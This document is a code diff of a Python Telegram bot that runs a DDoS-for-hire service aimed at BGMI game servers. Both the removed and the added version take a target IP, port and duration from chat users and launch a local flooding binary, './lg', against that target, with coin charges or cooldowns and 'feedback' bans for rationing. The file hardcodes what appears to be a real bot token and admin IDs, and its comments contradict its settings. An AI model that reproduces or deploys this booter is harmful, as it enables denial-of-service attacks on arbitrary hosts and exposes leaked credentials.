@@ -1,272 +1,181 @@
+import os
+import telebot
+import logging
 import asyncio
-from telegram import Update
-from telegram.ext import Application, CommandHandler, CallbackContext
-from datetime import datetime
-import subprocess
+from datetime import datetime, timedelta, timezone
 
-# Configuration
-TELEGRAM_BOT_TOKEN = '7828525928:AAGZIUO4QnLsD_ITKGSkfN5NlGP3UZvU1OM'  # Replace with your bot token
-ADMIN_USER_IDS = [7163028849, 1234567890]  # List of admin user IDs  # Replace with the admin user ID
-ALLOWED_GROUP_ID = -1002298552334  # Replace with your Telegram group ID
-USERS_FILE = 'users.txt'
-WALLET_FILE = 'wallets.txt'
-COINS_FILE = 'coins.txt'
-HISTORY_FILE = 'history.txt'
-attack_in_progress = False
+# Initialize logging
+logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 
-# Load and save functions
-def load_users():
-    try:
-        with open(USERS_FILE, 'r') as f:
-            return set(line.strip() for line in f)
-    except FileNotFoundError:
-        return set()
+# Telegram bot token and channel ID
+TOKEN = '7828525928:AAGZIUO4QnLsD_ITKGSkfN5NlGP3UZvU1OM'  # Replace with your actual bot token
+CHANNEL_ID = '-1002298552334'  # Replace with your specific channel or group ID
+# Initialize the bot
+bot = telebot.TeleBot(TOKEN)
 
-def save_users(users):
-    with open(USERS_FILE, 'w') as f:
-        f.writelines(f"{user}\n" for user in users)
+# Dictionary to track user attack counts, cooldowns, photo feedbacks, and bans
+user_attacks = {}
+user_cooldowns = {}
+user_photos = {}  # Tracks whether a user has sent a photo as feedback
+user_bans = {}  # Tracks user ban status and ban expiry time
+reset_time = datetime.now().astimezone(timezone(timedelta(hours=5, minutes=30))).replace(hour=0, minute=0, second=0, microsecond=0)
 
-def load_wallets():
-    try:
-        with open(WALLET_FILE) as f:
-            return {line.split()[0]: int(line.split()[1]) for line in f}
-    except FileNotFoundError:
-        return {}
+# Cooldown duration (in seconds)
+COOLDOWN_DURATION = 60  # 5 minutes
+BAN_DURATION = timedelta(minutes=1)  
+DAILY_ATTACK_LIMIT = 5000  # Daily attack limit per user
 
-def save_wallets(wallets):
-    with open(WALLET_FILE, 'w') as f:
-        f.writelines(f"{user} {coins}\n" for user, coins in wallets.items())
+# List of user IDs exempted from cooldown, limits, and photo requirements
+EXEMPTED_USERS = [7163028849, 7184121244]
 
-
-def load_coins():
-    try:
-        with open(COINS_FILE, 'r') as f:
-            return {line.split()[0]: int(line.split()[1]) for line in f}
-    except FileNotFoundError:
-        return {}
-
-def save_coins(coins):
-    with open(COINS_FILE, 'w') as f:
-        f.writelines(f"{user} {amount}\n" for user, amount in coins.items())
-
-def log_attack(user_id, ip, port, duration, coins_deducted):
-    with open(HISTORY_FILE, 'a') as f:
-        f.write(f"{user_id} | {ip}:{port} | {duration}s | {coins_deducted} coins | {datetime.now()}\n")
-
-# Globals
-users = load_users()
-coins = load_coins()
-wallets = load_wallets()  # Initialize an empty dictionary
+def reset_daily_counts():
+    """Reset the daily attack counts and other data at 12 AM IST."""
+    global reset_time
+    ist_now = datetime.now(timezone.utc).astimezone(timezone(timedelta(hours=5, minutes=30)))
+    if ist_now >= reset_time + timedelta(days=1):
+        user_attacks.clear()
+        user_cooldowns.clear()
+        user_photos.clear()
+        user_bans.clear()
+        reset_time = ist_now.replace(hour=0, minute=0, second=0, microsecond=0) + timedelta(days=1)
 
 
-def is_group_chat(update: Update) -> bool:
-    chat_id = update.effective_chat.id
-    return chat_id == ALLOWED_GROUP_ID  # Replace with your group's ID
+# Function to validate IP address
+def is_valid_ip(ip):
+    parts = ip.split('.')
+    return len(parts) == 4 and all(part.isdigit() and 0 <= int(part) <= 255 for part in parts)
 
+# Function to validate port number
+def is_valid_port(port):
+    return port.isdigit() and 0 <= int(port) <= 65535
 
-# Handlers
-async def start(update: Update, context: CallbackContext):
-    if not is_group_chat(update):
-        await update.message.reply_text("⚠️ This bot can only be used in the specified group.")
+# Function to validate duration
+def is_valid_duration(duration):
+    return duration.isdigit() and int(duration) > 0
+
+# Handler for photos sent by users
+@bot.message_handler(content_types=['photo'])
+def handle_photo(message):
+    user_id = message.from_user.id
+    user_photos[user_id] = True  # Mark that the user has sent a photo as feedback
+
+@bot.message_handler(commands=['bgmi'])
+def bgmi_command(message):
+    global user_attacks, user_cooldowns, user_photos, user_bans
+    user_id = message.from_user.id
+    user_name = message.from_user.first_name or "Unknown"
+
+    # Ensure the bot only works in the specified channel or group
+    if str(message.chat.id) != CHANNEL_ID:
+        bot.send_message(message.chat.id, " ⚠️⚠️ 𝗧𝗵𝗶𝘀 𝗯𝗼𝘁 𝗶𝘀 𝗻𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘁𝗼 𝗯𝗲 𝘂𝘀𝗲𝗱 𝗵𝗲𝗿𝗲 ⚠️⚠️ \n\n[ 𝗕𝗢𝗧 𝗠𝗔𝗗𝗘 𝗕𝗬 : @Topten_Kari ( Kari ) | 𝗗𝗠 𝗙𝗢𝗥 𝗥𝗘𝗕𝗥𝗔𝗡𝗗𝗜𝗡𝗚 ]")
         return
 
-    message = (
-        "🔥 Welcome to the UnRealHax Bot 🔥\n\n"
-        "Commands:\n"
-        "/attack <ip> <port> <duration> - Launch an attack\n"
-        "/account - Check your coins\n"
-        "/logs - View your attack logs\n"
-    )
-    await update.message.reply_text(message)
+    # Reset counts daily
+    reset_daily_counts()
 
-
-async def manage(update: Update, context: CallbackContext):
-    if update.effective_chat.id != ALLOWED_GROUP_ID:
-        await update.message.reply_text("⚠️ This bot can only be used in the specified group.")
-        return
-
-    if update.effective_user.id not in ADMIN_USER_IDS:  # Updated to allow multiple admins
-        await update.message.reply_text("⚠️ You need admin privileges to use this command.")
-        return
-
-    args = context.args
-    if len(args) != 2:
-        await update.message.reply_text("⚠️ Usage: /manage <add|rem> <user_id>")
-        return
-
-    command, target_user_id = args
-    target_user_id = target_user_id.strip()
-
-    if command == 'add':
-        users.add(target_user_id)
-        save_users(users)
-        if target_user_id not in coins:
-            coins[target_user_id] = 2000  # Add 2000 free coins for new users
-            save_coins(coins)
-        await update.message.reply_text(f"✔️ User {target_user_id} added with 2000 bonus coins.")
-    elif command == 'rem':
-        users.discard(target_user_id)
-        save_users(users)
-        await update.message.reply_text(f"✔️ User {target_user_id} removed.")
-    else:
-        await update.message.reply_text("⚠️ Invalid command. Use add or rem.")
-
-
-async def add_coin(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-    args = context.args
-
-    if chat_id != ALLOWED_GROUP_ID:
-        await update.message.reply_text("⚠️ Use commands in the allowed group only.")
-        return
-
-    if update.effective_user.id not in ADMIN_USER_IDS:
-        await update.message.reply_text("⚠️ You need admin privileges to use this command.")
-        return
-
-    if len(args) != 2:
-        await update.message.reply_text("⚠️ Usage: /addcoin <user_id> <amount>")
-        return
-
-    user_id, amount = args
-    try:
-        amount = int(amount)
-    except ValueError:
-        await update.message.reply_text("⚠️ Amount must be an integer.")
-        return
-
-    coins[user_id] = coins.get(user_id, 0) + amount
-    save_coins(coins)
-    await update.message.reply_text(f"✔️ Added {amount} coins to user {user_id}.")
-
-async def my_account(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-    user_id = str(update.effective_user.id)
-
-    if chat_id != ALLOWED_GROUP_ID:
-        await update.message.reply_text("⚠️ Use commands in the allowed group only.")
-        return
-
-    user_coins = coins.get(user_id, 0)
-    await update.message.reply_text(f"💰 Your Coins: {user_coins}")
-
-async def history(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-    user_id = str(update.effective_user.id)
-
-    if chat_id != ALLOWED_GROUP_ID:
-        await update.message.reply_text("⚠️ Use commands in the allowed group only.")
-        return
-
-    try:
-        with open(HISTORY_FILE, 'r') as f:
-            logs = [line for line in f if line.startswith(user_id)]
-        if logs:
-            log_text = "\n".join(logs)
-            await update.message.reply_text(f"📜 Your Attack Logs:\n{log_text}")
+    # Check if the user is banned
+    if user_id in user_bans:
+        ban_expiry = user_bans[user_id]
+        if datetime.now() < ban_expiry:
+            remaining_ban_time = (ban_expiry - datetime.now()).total_seconds()
+            minutes, seconds = divmod(remaining_ban_time, 60)
+            bot.send_message(
+                message.chat.id,
+                f"⚠️⚠️ 𝙃𝙞 {message.from_user.first_name}, 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙗𝙖𝙣𝙣𝙚𝙙 𝙛𝙤𝙧 𝙣𝙤𝙩 𝙥𝙧𝙤𝙫𝙞𝙙𝙞𝙣𝙜 𝙛𝙚𝙚𝙙𝙗𝙖𝙘𝙠. 𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩 {int(minutes)} 𝙢𝙞𝙣𝙪𝙩𝙚𝙨 𝙖𝙣𝙙 {int(seconds)} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 𝙗𝙚𝙛𝙤𝙧𝙚 𝙩𝙧𝙮𝙞𝙣𝙜 𝙖𝙜𝙖𝙞𝙣 !  ⚠️⚠️"
+            )
+            return
         else:
-            await update.message.reply_text("⚠️ No logs found.")
-    except FileNotFoundError:
-        await update.message.reply_text("⚠️ No logs found.")
+            del user_bans[user_id]  # Remove ban after expiry
 
-async def attack(update: Update, context: CallbackContext):
-    if not is_group_chat(update):
-        await update.message.reply_text("⚠️ This bot can only be used in the specified group.")
-        return
+    # Check if user is exempted from cooldowns, limits, and feedback requirements
+    if user_id not in EXEMPTED_USERS:
+        # Check if user is in cooldown
+        if user_id in user_cooldowns:
+            cooldown_time = user_cooldowns[user_id]
+            if datetime.now() < cooldown_time:
+                remaining_time = (cooldown_time - datetime.now()).seconds
+                bot.send_message(
+                    message.chat.id,
+                    f"⚠️⚠️ 𝙃𝙞 {message.from_user.first_name}, 𝙮𝙤𝙪 𝙖𝙧𝙚 𝙘𝙪𝙧𝙧𝙚𝙣𝙩𝙡𝙮 𝙤𝙣 𝙘𝙤𝙤𝙡𝙙𝙤𝙬𝙣. 𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩 {remaining_time // 60} 𝙢𝙞𝙣𝙪𝙩𝙚𝙨 𝙖𝙣𝙙 {remaining_time % 60} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 𝙗𝙚𝙛𝙤𝙧𝙚 𝙩𝙧𝙮𝙞𝙣𝙜 𝙖𝙜𝙖𝙞𝙣 ⚠️⚠️ "
+                )
+                return
 
-    # Existing logic for attack command
+        # Check attack count
+        if user_id not in user_attacks:
+            user_attacks[user_id] = 0
 
-    global attack_in_progress
+        if user_attacks[user_id] >= DAILY_ATTACK_LIMIT:
+            bot.send_message(
+                message.chat.id,
+                f"𝙃𝙞 {message.from_user.first_name}, 𝙮𝙤𝙪 𝙝𝙖𝙫𝙚 𝙧𝙚𝙖𝙘𝙝𝙚𝙙 𝙩𝙝𝙚 𝙢𝙖𝙭𝙞𝙢𝙪𝙢 𝙣𝙪𝙢𝙗𝙚𝙧 𝙤𝙛 𝙖𝙩𝙩𝙖𝙘𝙠-𝙡𝙞𝙢𝙞𝙩 𝙛𝙤𝙧 𝙩𝙤𝙙𝙖𝙮, 𝘾𝙤𝙢𝙚𝘽𝙖𝙘𝙠 𝙏𝙤𝙢𝙤𝙧𝙧𝙤𝙬 ✌️"
+            )
+            return
 
-    chat_id = update.effective_chat.id
-    user_id = str(update.effective_user.id)
-    args = context.args
+        # Check if the user has provided feedback after the last attack
+        if user_id in user_attacks and user_attacks[user_id] > 0 and not user_photos.get(user_id, False):
+            user_bans[user_id] = datetime.now() + BAN_DURATION  # Ban user for 2 hours
+            bot.send_message(
+                message.chat.id,
+                f"𝙃𝙞 {message.from_user.first_name}, ⚠️⚠️𝙔𝙤𝙪 𝙝𝙖𝙫𝙚𝙣'𝙩 𝙥𝙧𝙤𝙫𝙞𝙙𝙚𝙙 𝙛𝙚𝙚𝙙𝙗𝙖𝙘𝙠 𝙖𝙛𝙩𝙚𝙧 𝙮𝙤𝙪𝙧 𝙡𝙖𝙨𝙩 𝙖𝙩𝙩𝙖𝙘𝙠. 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙗𝙖𝙣𝙣𝙚𝙙 𝙛𝙧𝙤𝙢 𝙪𝙨𝙞𝙣𝙜 𝙩𝙝𝙞𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙛𝙤𝙧 30 𝙢𝙞𝙣𝙪𝙩𝙚𝙨 ⚠️⚠️"
+            )
+            return
 
-    if user_id not in users:
-        await update.message.reply_text("⚠️ You need approval to use this bot.")
-        return
-
-    if attack_in_progress:
-        await update.message.reply_text("⚠️ Another attack is in progress. Please wait for it to finish.")
-        return
-
-    if len(args) != 3:
-        await update.message.reply_text("⚠️ Usage: /attack <ip> <port> <duration>")
-        return
-
-    ip, port, duration = args
+    # Split the command to get parameters
     try:
-        duration = int(duration)
-    except ValueError:
-        await update.message.reply_text("⚠️ Duration must be an integer.")
-        return
-    
-    if duration > 240:
-        await update.message.reply_text("⚠️ Maximum attack duration is 240 seconds.")
-        return
+        args = message.text.split()[1:]  # Skip the command itself
+        logging.info(f"Received arguments: {args}")
 
+        if len(args) != 3:
+            raise ValueError("𝙏𝙊𝙋𝙏𝙀𝙉 𝙋𝙐𝘽𝙇𝙞𝘾 𝘿𝘿𝙊𝙎 𝘼𝘾𝙏𝙄𝙑𝙀 ✅ \n\n ⚙ 𝙋𝙡𝙚𝙖𝙨𝙚 𝙪𝙨𝙚 𝙩𝙝𝙚 𝙛𝙤𝙧𝙢𝙖𝙩\n /𝗯𝗴𝗺𝗶 <𝘁𝗮𝗿𝗴𝗲𝘁_𝗶𝗽> <𝘁𝗮𝗿𝗴𝗲𝘁_𝗽𝗼𝗿𝘁> <𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻>")
 
-    user_coins = coins.get(user_id, 0)
-    if user_coins < duration:
-        await update.message.reply_text("⚠️ Insufficient coins.")
-        return
+        target_ip, target_port, user_duration = args
 
-    # Deduct coins and start the attack
-    coins[user_id] = user_coins - duration
-    save_coins(coins)
-    attack_in_progress = True
+        # Validate inputs
+        if not is_valid_ip(target_ip):
+            raise ValueError("Invalid IP address.")
+        if not is_valid_port(target_port):
+            raise ValueError("Invalid port number.")
+        if not is_valid_duration(user_duration):
+            raise ValueError("Invalid duration. Must be a positive integer.")
 
-    await update.message.reply_text(f" 🚀 Attack Launched! 🚀 \n📡 Target Host:{ip}\n👉 Target Port:{port}\n⏰ Duration:{duration}")
+        # Increment attack count for non-exempted users
+        if user_id not in EXEMPTED_USERS:
+            user_attacks[user_id] += 1
+            user_photos[user_id] = False  # Reset photo feedback requirement
 
-    # Offload the attack to a background task
-    context.application.create_task(run_attack(ip, port, duration, update, context))
+        # Set cooldown for non-exempted users
+        if user_id not in EXEMPTED_USERS:
+            user_cooldowns[user_id] = datetime.now() + timedelta(seconds=COOLDOWN_DURATION)
 
-async def run_attack(ip: str, port: str, duration: int, update: Update, context: CallbackContext):
-    global attack_in_progress
-    try:
-        # Run the binary file
-        process = subprocess.Popen(
-            [f"./lg", ip, port, str(duration), "900"],
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE
+        # Notify that the attack will run for the default duration of 150 seconds, but display the input duration
+        default_duration = 180
+        bot.send_message(
+            message.chat.id,
+            f"🚀𝙃𝙞 {message.from_user.first_name}, 𝘼𝙩𝙩𝙖𝙘𝙠 𝙨𝙩𝙖𝙧𝙩𝙚𝙙 𝙤𝙣 {target_ip} : {target_port} 𝙛𝙤𝙧 {default_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 [ 𝙊𝙧𝙞𝙜𝙞𝙣𝙖𝙡 𝙞𝙣𝙥𝙪𝙩: {user_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 ] \n\n❗️❗️ 𝙋𝙡𝙚𝙖𝙨𝙚 𝙎𝙚𝙣𝙙 𝙁𝙚𝙚𝙙𝙗𝙖𝙘𝙠 ❗️❗️"
         )
 
-        # Wait for the process to complete asynchronously
-        while process.poll() is None:
-            await asyncio.sleep(1)
+        # Log the attack started message
+        logging.info(f"Attack started by {user_name}: ./lg {target_ip} {target_port} {default_duration} 900")
 
-        # Capture output and errors
-        stdout, stderr = process.communicate()
-        if process.returncode == 0:
-            await context.bot.send_message(
-                chat_id=update.effective_chat.id,
-                text=f"✅ Attack completed successfully!"
-            )
-        else:
-            await context.bot.send_message(
-                chat_id=update.effective_chat.id,
-                text=f"⚠️ Attack failed! Error: {stderr.decode().strip()}"
-            )
+        # Run the attack command with the default duration and pass the user-provided duration for the finish message
+        asyncio.run(run_attack_command_async(target_ip, int(target_port), default_duration, user_duration, user_name))
+
     except Exception as e:
-        await context.bot.send_message(
-            chat_id=update.effective_chat.id,
-            text=f"⚠️ An error occurred: {str(e)}"
-        )
-    finally:
-        attack_in_progress = False
+        bot.send_message(message.chat.id, str(e))
 
-# Main function
-def main():
-    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
+async def run_attack_command_async(target_ip, target_port, duration, user_duration, user_name):
+    try:
+        command = f"./lg {target_ip} {target_port} {duration} 900"
+        process = await asyncio.create_subprocess_shell(command)
+        await process.communicate()
+        bot.send_message(CHANNEL_ID, f"🚀 𝘼𝙩𝙩𝙖𝙘𝙠 𝙤𝙣 {target_ip} : {target_port}  𝙛𝙞𝙣𝙞𝙨𝙝𝙚𝙙 ✅ [ 𝙊𝙧𝙞𝙜𝙞𝙣𝙖𝙡 𝙞𝙣𝙥𝙪𝙩: {user_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨.\n\n𝗧𝗵𝗮𝗻𝗸𝗬𝗼𝘂 𝗙𝗼𝗿 𝘂𝘀𝗶𝗻𝗴 𝗢𝘂𝗿 𝗦𝗲𝗿𝘃𝗶𝗰𝗲 <> 𝗧𝗲𝗮𝗺 ™")
+    except Exception as e:
+        bot.send_message(CHANNEL_ID, f"Error running attack command: {e}")
 
-    application.add_handler(CommandHandler("start", start))
-    application.add_handler(CommandHandler("manage", manage))
-    application.add_handler(CommandHandler("addcoin", add_coin))
-    application.add_handler(CommandHandler("account", my_account))
-    application.add_handler(CommandHandler("logs", history))
-    application.add_handler(CommandHandler("attack", attack))
-
-    application.run_polling()
-
+# Start the bot
 if __name__ == "__main__":
-    main()
+    logging.info("Bot is starting...")
+    try:
+        bot.polling(none_stop=True)
+    except Exception as e:
+        logging.error(f"An error occurred: {e}")
